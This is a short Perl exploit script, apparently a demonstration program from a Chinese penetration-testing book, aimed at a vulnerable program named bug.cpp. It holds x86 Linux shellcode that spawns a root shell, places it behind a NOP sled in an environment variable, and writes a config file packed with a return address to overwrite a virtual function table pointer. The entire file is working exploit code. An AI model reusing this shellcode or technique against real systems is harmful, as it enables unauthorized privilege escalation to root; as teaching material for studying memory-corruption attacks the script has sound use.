#!/usr/bin/perl
# ex.pl
#
# 《网络渗透技术》演示程序
# 作者：san, alert7, eyas, watercloud
#
# 用于攻击bug.cpp，覆盖虚函数指针表来执行shellcode，从而获得root权限
#
%ENV={};
$SHELL="1\xc0PPP[YZ4\xd0\xcd\x80";
$SHELL.="j\x0bX\x99Rhn/shh//biT[RSTY\xcd\x80";

$ENV{KKK}="\x90"x 128 . $SHELL;

open $f,">bug.conf" || die "open file bug.conf error.";

print $f "AA" , "\xff\xbf\x80\xff" x 100,"\n"; #ADDR: 0xbfffff80
close($f);

exec "./bug";
#EOF
